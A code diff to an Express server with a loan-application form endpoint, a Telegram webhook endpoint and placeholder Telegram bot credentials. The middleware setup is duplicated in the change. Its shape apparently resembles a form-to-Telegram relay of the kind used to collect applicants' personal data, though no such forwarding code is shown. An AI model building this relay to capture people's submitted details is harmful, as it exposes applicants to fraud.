@@ -1,15 +1,22 @@
 const express = require('express');
-const cors = require('cors');
+const path = require('path');
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+app.use(express.static(path.join(__dirname, 'public')));
 
 // ⚠️ SYSTEM CONFIGURATION: Insert your secure credentials here
 const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
 const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
-
-app.use(cors());
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+app.use(express.static(path.join(__dirname, 'public')));
+
 
 // 1. Initial Application Form Endpoint (Triggered by Web Form)
 app.post('/api/apply-loan', async (req, res) => {
@@ -114,6 +121,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return res.sendStatus(200);
 });
 
-app.listen(PORT, () => {
-    console.log(`🚀 Security proxy server active on http://localhost:${PORT}`);
+app.listen(PORT, "0.0.0.0", () => {
+    console.log(`Server running on port ${PORT}`);
 });
